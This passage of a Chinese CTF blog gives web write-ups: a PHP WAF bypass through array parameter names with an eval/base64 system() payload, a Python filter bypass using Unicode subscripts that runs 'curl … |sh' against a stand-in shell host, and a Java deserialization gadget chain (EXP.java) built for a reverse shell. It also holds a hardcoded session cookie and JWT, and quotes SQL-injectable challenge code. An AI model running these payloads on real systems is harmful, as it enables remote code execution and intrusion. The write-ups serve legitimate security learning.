class="string">&quot;rt_web_csrf_token=kOIwOsYocCJkXVKSQmTFWuvDWpVuizhu013Lxk78cg54iyChQBApFDCItboLOJeW; rt_web__jwt_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiZDRkMzhkNTVmYTdlZTIxYTgzODQ2MTUyNjg3NWYyMDMiLCJ1c2VybmFtZSI6IjE1Nzk5MDYwODUyIiwiZXhwIjoxNjg0OTMwNTY5LCJlbWFpbCI6IjE0Nzg0NTYzMDlAcXEuY29tIn0.M_dtAsuFk53-OccuslbUMB8s1BgQTF4LnBNp6gYecJ4; connect.sid=s%3AMrWVq2g4AyaXTVVHfmYR-lk66QfcMNuC.2bEPGUZvaMBVCw7UlneXFQjT4t9oTEzCW6x4HkCtHkI·&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url, json=data, headers=headers)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230523205848825.png" alt="image-20230523205848825"></p><p>这里记得把cookie给换上自己的</p><h2 id="easy-log"><a href="#easy-log" class="headerlink" title="easy_log"></a>easy_log</h2><p>题目是长这样的</p><p><img src="../images/image-20230523210140219.png" alt="image-20230523210140219"></p><p><img src="../images/image-20230523210119944.png" alt="image-20230523210119944"></p><p>就是通过自己输入的值，来到这个php文件里执行代码，当然也过滤了很多东西</p><p><img src="../images/image-20230523210328183.png" alt="image-20230523210328183"></p><p>php文件里就是这些内容 </p><p>这里的话因为username被过滤太多东西了，<strong>php标记</strong>全给过滤掉了</p><p>于是我们就去看看ip或者uri能不能传值</p><p><img src="../images/image-20230523210917110.png" alt="image-20230523210917110"></p><p><img src="../images/image-20230523210923513.png" alt="image-20230523210923513"></p><p>写是写进去了，但是并没有执行</p><p>然后查看源码发现</p><p><img src="../images/image-20230523210956502.png" alt="image-20230523210956502"></p><p>这里的把<code>&lt;</code>给换掉了，那么我们就得另寻出路了</p><p>真正的解法就是传数组，这里的话waf只对参数的值的有用，对参数名是没有用的，</p><p><code>username[xxx]=123</code></p><p>就是后端只会检测123，并不会检测xxx</p><p>所以我们就可以利用这个方法来传参</p><p>直接用超级编码法</p><p><code>password=asd&amp;username[&lt;?php%20eval(base64_decode(c3lzdGVtKCJscyAvIik7));?&gt;]=123</code></p><p>这是编码内容是<code>system(&#39;ls /&#39;);</code></p><p>然后读出文件名</p><p><code>password=asd&amp;username[&lt;?php%20eval(base64_decode(c3lzdGVtKCdjYXQgL1MzcmVjdF8xU19IM3JlJyk7));?&gt;]=123</code></p><p><img src="../images/image-20230523211833958.png" alt="image-20230523211833958"></p><p>然后就读到了flag</p><h2 id="ezpython"><a href="#ezpython" class="headerlink" title="ezpython"></a>ezpython</h2><p>题目</p><p><img src="../images/image-20230523212029359.png" alt="image-20230523212029359"></p><p>就是绕过关键字的过滤</p><p>这里的话我使用迷你下标进行绕过的(在之前的d3学到的这个)</p><p>payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ₑval(__impₒrt__(<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>).pₒpen(<span class="string">&#x27;curl https://your-shell.com/xxxx:666 |sh&#x27;</span>).read())</span><br></pre></td></tr></table></figure><h2 id="fun-java"><a href="#fun-java" class="headerlink" title="fun_java"></a>fun_java</h2><p><img src="../images/image-20230523212639053.png" alt="image-20230523212639053"></p><p><strong>Jckson调getter，然后TemplatesImpl命令执行，和阿里云bypass_1差不多，但我没做出来</strong></p><p><strong>这是个文章开头给的链接的那个师傅写的</strong>(这里话先去看看<strong>bypass_1</strong>)</p>]]></content>
      
      
      
        <tags>
            
            <tag> 上海磐石行动-web-2023 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java-反序列化题目</title>
      <link href="/posts/450c467.html"/>
      <url>/posts/450c467.html</url>
      
        <content type="html"><![CDATA[<p>这里的话是记录一下关于java反序列化的刷题</p><p><strong>(因为刚把一些链子给跟完)</strong></p><h2 id="东华杯ezgadget"><a href="#东华杯ezgadget" class="headerlink" title="东华杯ezgadget"></a>东华杯ezgadget</h2><p>原题的jar包 可以把代码拷出来自己跑下<br>链接：<a href="https://pan.baidu.com/s/1t5-fV7SUETDEI5-qbZZQrw">https://pan.baidu.com/s/1t5-fV7SUETDEI5-qbZZQrw</a><br>提取码：8do5</p><p><code>java -jar ezgadget.jar</code>在kali或者自己的服务器上运行跑一下，搭建一个环境</p><p>拿到jar包后先放到<strong>jd-gui</strong>里面进行反编译一下</p><p>然后在导到idea进行测试(<strong>这里的话是得根据题目自己创建package来导入</strong>)</p><p><img src="../images/image-20230522161955641.png" alt="image-20230522161955641"></p><p>导入到idea里后，进行代码审计</p><p>先是查看<code>pom.xml</code>看有无一些常见链子的依赖</p><p><img src="../images/image-20230522162058331.png" alt="image-20230522162058331"></p><p>这里的话是没有</p><p><strong>Tools.java</strong></p><p><img src="../images/image-20230522162207881.png" alt="image-20230522162207881"></p><p>这里提供了他一些函数是进行base64编码和解码的，还有序列化和反序列化的</p><p><strong>IndexController.java</strong></p><p><img src="../images/image-20230522163815734.png" alt="image-20230522163815734"></p><p><strong>TostringBean.java</strong></p><p><img src="../images/image-20230522162343938.png" alt="image-20230522162343938"></p><p>这里话是提供了一个动态类加载的<code>defineClass</code>方法     并且还会实例化</p><p>这里话就说明了这道题是不出网的，得在自己本地执行编译过的恶意代码</p><p>那么我们就得找一下谁调用了这个<code>TostringBean.toString()</code>方法</p><p>这里如果对cc链比较熟悉的话，一下就能猜出来了</p><p><img src="../images/image-20230522163614748.png" alt="image-20230522163614748"></p><p>cc5这条链子就有一个类的<code>readObject</code>方法是调用这个<code>toSting</code>方法的</p><p>于是调用链就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException.readobject  --&gt; ToStringBean.toString</span><br></pre></td></tr></table></figure><p>于是我们就开始写exp</p><p>这里的话先从执行代码那部分开始写</p><p><img src="../images/image-20230522164138690.png" alt="image-20230522164138690"></p><p>这里话是得使用反射调用来给这个参数赋值</p><p><strong>这里附的值就是我们本地的编译过的恶意代码</strong></p><p><img src="../images/image-20230522164815484.png" alt="image-20230522164815484"></p><p><img src="../images/image-20230522165301451.png" alt="image-20230522165301451"></p><p>然后就把执行代码的这部分写完了</p><p>接下来就是写使用<code>BadAttributeValueExpException.readobject</code>来触发<code>toString</code>这个函数了</p><p>先跟进去看一下这个类</p><p><strong>先看他的构造函数</strong></p><p><img src="../images/image-20230522165750768.png" alt="image-20230522165750768"></p><p>在实例化的时候会执行这个方法，赋值就会执行toString方法，但是这里我们不能直接传Tostingbean方法，因为如果这里进行了调用了话，readobject方法的时候在调用会报错</p><p>所以这里的我们在实例化的时候就随便传一个值。</p><p><strong>在看一下他的readobject方法</strong></p><p><img src="../images/image-20230522165951342.png" alt="image-20230522165951342"></p><p>就是会获取val这个参数的值并赋给valObj这个参数，然后在最后的时候就会调用valObj.toString()方法</p><p>所以关键点就在这个val参数这里，这里的话我们就可以考虑使用反射调用来进行修改这里的值</p><p><img src="../images/image-20230522170424460.png" alt="image-20230522170424460"></p><p>这样就写好了</p><p>然后因为在这个/readobject路由里还得满足一些要求才能进行反序列化</p><p><img src="../images/image-20230522170453923.png" alt="image-20230522170453923"></p><p><img src="../images/image-20230522170752259.png" alt="image-20230522170752259"></p><p>这样就全部写完了</p><p>但是这里得需要先进行解码，所以我们还得对字节流进行编码</p><p><img src="../images/image-20230522170835166.png" alt="image-20230522170835166"></p><p><img src="../images/image-20230522171128098.png" alt="image-20230522171128098"></p><p>进行了编码</p><p>然后输出</p><p><img src="../images/image-20230522172417365.png" alt="image-20230522172417365"></p><p>然后将编码后的结果进行<strong>url编码</strong>，然后data传参就行了(<strong>必须得进行url编码 </strong>)</p><p>就可以成功反弹shell了</p><p><strong>EXP.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ezgame.ctf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ezgame.ctf.tools.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.ezgame.ctf.tools.Tools;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EXP</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> toStringBean.getClass().getDeclaredField(<span class="string">&quot;ClassByte&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\ctf application\\idea\\IntelliJ IDEA Community Edition 2022.3.1\\project\\ezgadget\\target\\classes\\com\\ezgame\\ctf\\payload.class&quot;</span>));</span><br><span class="line">        field.set(toStringBean,bytes);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">123123123</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">filed</span> <span class="operator">=</span> badAttributeValueExpException.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        filed.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        filed.set(badAttributeValueExpException,toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeUTF(<span class="string">&quot;gadgets&quot;</span>);</span><br><span class="line">        objectOutputStream.writeInt(<span class="number">2021</span>);</span><br><span class="line">        objectOutputStream.writeObject(badAttributeValueExpException);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes1 = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> Tools.base64Encode(bytes1);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>妈的  吐槽一下  这里的话得需要jdk1.8来运行jar包   如果用jdk17的话   会shell弹不上去</strong>(这里卡了好久，晕了)</p><h2 id="网鼎杯-2020-朱雀组-Think-Java"><a href="#网鼎杯-2020-朱雀组-Think-Java" class="headerlink" title="[网鼎杯 2020 朱雀组]Think Java"></a>[网鼎杯 2020 朱雀组]Think Java</h2><p>考点</p><p><a href="https://tttang.com/archive/1877/#toc_mysql-jdbc">MYSQL JDBC反序列化解析</a>  </p><p>(<strong>上面的文章是讲造成这个jdbc反序列化的原因，并且跟着链一步一步分析</strong>)</p><p>(<strong>下面的文章是讲使用mysql恶意服务来配合着jdbc反序列化漏洞来使用</strong>)</p><p><a href="https://www.mi1k7ea.com/2021/04/23/MySQL-JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#JDBC%E7%AE%80%E4%BB%8B">MYSql恶意服务+ JDBC的使用 </a></p><p><a href="https://blog.csdn.net/RABCDXB/article/details/124003575">参考文章</a></p><p><strong>jdbc反序列化 (jdbc sql注入)  rome链</strong></p><p>先下载jar包，然后丢进jd-gui里进行分析</p><p><img src="../images/image-20230525105104895.png" alt="image-20230525105104895"></p><p>这里的话就只给了部分代码</p><p><strong>Row.java</strong></p><p>就是自己写了有个Row类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> sqldict;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Row</span> &#123;</span><br><span class="line">  String name;</span><br><span class="line">  </span><br><span class="line">  String type;</span><br><span class="line">  </span><br><span class="line">  String def;</span><br><span class="line">  </span><br><span class="line">  String isNull;</span><br><span class="line">  </span><br><span class="line">  String isAuto;</span><br><span class="line">  </span><br><span class="line">  String remark;</span><br><span class="line">  </span><br><span class="line">  String isPK;</span><br><span class="line">  </span><br><span class="line">  String size;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getIsPK</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.isPK;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setIsPK</span><span class="params">(String isPK)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.isPK = isPK;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getType</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.type;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setType</span><span class="params">(String type)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.type = type;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getDef</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.def;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDef</span><span class="params">(String def)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.def = def;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getIsNull</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.isNull;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setIsNull</span><span class="params">(String isNull)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.isNull = isNull;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getIsAuto</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.isAuto;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setIsAuto</span><span class="params">(String isAuto)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.isAuto = isAuto;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getRemark</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.remark;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setRemark</span><span class="params">(String remark)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.remark = remark;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getSize</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.size;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSize</span><span class="params">(String size)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.size = size;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">Row</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">Row</span><span class="params">(String name, String type, String def, String isNull, String isAuto, String remark, String isPK, String size)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">    <span class="built_in">this</span>.type = type;</span><br><span class="line">    <span class="built_in">this</span>.def = def;</span><br><span class="line">    <span class="built_in">this</span>.isNull = isNull;</span><br><span class="line">    <span class="built_in">this</span>.isAuto = isAuto;</span><br><span class="line">    <span class="built_in">this</span>.remark = remark;</span><br><span class="line">    <span class="built_in">this</span>.isPK = isPK;</span><br><span class="line">    <span class="built_in">this</span>.size = size;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>SqlDict.java</strong></p><p>连接数据库，其中sql语句处存在sql注入漏洞</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> sqldict;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.abc.core.sqldict.Row;</span><br><span class="line"><span class="keyword">import</span> cn.abc.core.sqldict.Table;</span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DatabaseMetaData;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqlDict</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title function_">getConnection</span><span class="params">(String dbName, String user, String pass)</span> &#123;</span><br><span class="line">    <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (dbName != <span class="literal">null</span> &amp;&amp; !dbName.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        dbName = <span class="string">&quot;jdbc:mysql://mysqldbserver:3306/&quot;</span> + dbName;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        dbName = <span class="string">&quot;jdbc:mysql://mysqldbserver:3306/myapp&quot;</span>;</span><br><span class="line">      &#125; </span><br><span class="line">      <span class="keyword">if</span> (user == <span class="literal">null</span> || dbName.equals(<span class="string">&quot;&quot;</span>))</span><br><span class="line">        user = <span class="string">&quot;root&quot;</span>; </span><br><span class="line">      <span class="keyword">if</span> (pass == <span class="literal">null</span> || dbName.equals(<span class="string">&quot;&quot;</span>))</span><br><span class="line">        pass = <span class="string">&quot;abc@12345&quot;</span>; </span><br><span class="line">      conn = DriverManager.getConnection(dbName, user, pass);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException var5) &#123;</span><br><span class="line">      var5.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SQLException var6) &#123;</span><br><span class="line">      var6.printStackTrace();</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> conn;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> List&lt;Table&gt; <span class="title function_">getTableData</span><span class="params">(String dbName, String user, String pass)</span> &#123;</span><br><span class="line">    List&lt;Table&gt; Tables = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> getConnection(dbName, user, pass);</span><br><span class="line">    <span class="type">String</span> <span class="variable">TableName</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> conn.createStatement();</span><br><span class="line">      <span class="type">DatabaseMetaData</span> <span class="variable">metaData</span> <span class="operator">=</span> conn.getMetaData();</span><br><span class="line">      <span class="type">ResultSet</span> <span class="variable">tableNames</span> <span class="operator">=</span> metaData.getTables((String)<span class="literal">null</span>, (String)<span class="literal">null</span>, (String)<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;TABLE&quot;</span> &#125;);</span><br><span class="line">      <span class="keyword">while</span> (tableNames.next()) &#123;</span><br><span class="line">        TableName = tableNames.getString(<span class="number">3</span>);</span><br><span class="line">        <span class="type">Table</span> <span class="variable">table</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Table</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = &#x27;&quot;</span> + dbName + <span class="string">&quot;&#x27; and table_name=&#x27;&quot;</span> + TableName + <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> stmt.executeQuery(sql);</span><br><span class="line">        <span class="keyword">while</span> (rs.next())</span><br><span class="line">          table.setTableDescribe(rs.getString(<span class="string">&quot;TABLE_COMMENT&quot;</span>)); </span><br><span class="line">        table.setTableName(TableName);</span><br><span class="line">        <span class="type">ResultSet</span> <span class="variable">data</span> <span class="operator">=</span> metaData.getColumns(conn.getCatalog(), (String)<span class="literal">null</span>, TableName, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="type">ResultSet</span> <span class="variable">rs2</span> <span class="operator">=</span> metaData.getPrimaryKeys(conn.getCatalog(), (String)<span class="literal">null</span>, TableName);</span><br><span class="line">        String PK;</span><br><span class="line">        <span class="keyword">for</span> (PK = <span class="string">&quot;&quot;</span>; rs2.next(); PK = rs2.getString(<span class="number">4</span>));</span><br><span class="line">        <span class="keyword">while</span> (data.next()) &#123;</span><br><span class="line">          <span class="type">Row</span> <span class="variable">row</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Row</span>(data.getString(<span class="string">&quot;COLUMN_NAME&quot;</span>), data.getString(<span class="string">&quot;TYPE_NAME&quot;</span>), data.getString(<span class="string">&quot;COLUMN_DEF&quot;</span>), data.getString(<span class="string">&quot;NULLABLE&quot;</span>).equals(<span class="string">&quot;1&quot;</span>) ? <span class="string">&quot;YES&quot;</span> : <span class="string">&quot;NO&quot;</span>, data.getString(<span class="string">&quot;IS_AUTOINCREMENT&quot;</span>), data.getString(<span class="string">&quot;REMARKS&quot;</span>), data.getString(<span class="string">&quot;COLUMN_NAME&quot;</span>).equals(PK) ? <span class="string">&quot;true&quot;</span> : <span class="literal">null</span>, data.getString(<span class="string">&quot;COLUMN_SIZE&quot;</span>));</span><br><span class="line">          table.list.add(row);</span><br><span class="line">        &#125; </span><br><span class="line">        Tables.add(table);</span><br><span class="line">      &#125; </span><br><span class="line">    &#125; <span class="keyword">catch</span> (SQLException var16) &#123;</span><br><span class="line">      var16.printStackTrace();</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> Tables;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>Table.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 